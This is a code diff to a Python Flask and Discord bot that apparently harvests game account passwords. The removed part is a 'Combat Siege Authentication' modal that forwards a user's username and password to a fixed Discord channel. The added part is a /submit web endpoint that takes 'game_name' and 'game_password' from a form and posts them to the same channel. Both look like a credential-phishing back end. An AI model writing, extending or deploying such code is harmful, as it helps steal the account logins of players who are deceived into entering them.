@@ -1,6 +1,7 @@
 import os
 import threading
-from flask import Flask
+import asyncio
+from flask import Flask, request
 import discord
 from discord.ext import commands
 
@@ -11,48 +12,6 @@ app = Flask(__name__)
 def home():
     return "Bot is running!"
 
-def run_flask():
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
-
-threading.Thread(target=run_flask, daemon=True).start()
-
-# Popup Form (Modal) for Username and Password
-class CredentialsModal(discord.ui.Modal, title="Combat Siege Authentication"):
-    username = discord.ui.TextInput(
-        label="Username",
-        placeholder="Enter your username...",
-        required=True
-    )
-    password = discord.ui.TextInput(
-        label="Password",
-        placeholder="Enter your password...",
-        required=True,
-        style=discord.TextStyle.short
-    )
-
-    async def on_submit(self, interaction: discord.Interaction):
-        # Send the entered username and password to your channel
-        channel = interaction.client.get_channel(1558729581244977185)
-        if channel:
-            await channel.send(
-                f"🚨 **New Credentials Submitted!**\n"
-                f"• **Submitted by:** {interaction.user.mention}\n"
-                f"• **Username:** `{self.username.value}`\n"
-                f"• **Password:** `{self.password.value}`"
-            )
-        # Private confirmation message to the user
-        await interaction.response.send_message("Your credentials have been submitted successfully!", ephemeral=True)
-
-# Button View that triggers the popup
-class ApproveView(discord.ui.View):
-    def __init__(self):
-        super().__init__(timeout=None)  # Persistent button
-
-    @discord.ui.button(label="Enter Credentials", style=discord.ButtonStyle.green, custom_id="enter_creds_button")
-    async def button_callback(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_modal(CredentialsModal())
-
 # Discord Bot Setup
 intents = discord.Intents.default()
 intents.message_content = True
@@ -60,15 +19,44 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 CHANNEL_ID = 1558729581244977185 
 
+async def send_credential_alert(game_name, game_password):
+    try:
+        channel = bot.get_channel(CHANNEL_ID)
+        print(f"DEBUG: Looking for channel {CHANNEL_ID}, found: {channel}")
+        if channel:
+            await channel.send(
+                f"🆕 **NEW SIGN UP REQUEST!**\n"
+                f"🎮 **Game Name:** {game_name}\n"
+                f"🔑 **Game Password:** {game_password}"
+            )
+            print("SUCCESS: Credentials posted to Discord!")
+        else:
+            print(f"ERROR: Bot could not find channel {CHANNEL_ID}. Make sure the bot is added to your server!")
+    except Exception as e:
+        print(f"ERROR: Failed to send message to Discord: {e}")
+
+@app.route('/submit', methods=['POST'])
+def handle_submission():
+    data = request.json or request.form
+    game_name = data.get('game_name', 'Unknown')
+    game_password = data.get('game_password', 'Unknown')
+    
+    print(f"Received submission for Game Name: {game_name}")
+    
+    if bot.loop.is_running():
+        asyncio.run_coroutine_threadsafe(send_credential_alert(game_name, game_password), bot.loop)
+        return {"status": "success", "message": "Alert sent to Discord!"}, 200
+    else:
+        return {"status": "error", "message": "Bot is offline"}, 500
+
+def run_flask():
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
+
+threading.Thread(target=run_flask, daemon=True).start()
+
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user.name}')
-    bot.add_view(ApproveView())  # Keep the button active
-    
-    channel = bot.get_channel(CHANNEL_ID)
-    if channel:
-        await channel.send("Click below to log in / authenticate:", view=ApproveView())
-    else:
-        print(f"Could not find channel with ID {CHANNEL_ID}")
+    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
 
 bot.run(os.environ.get("DISCORD_TOKEN"))
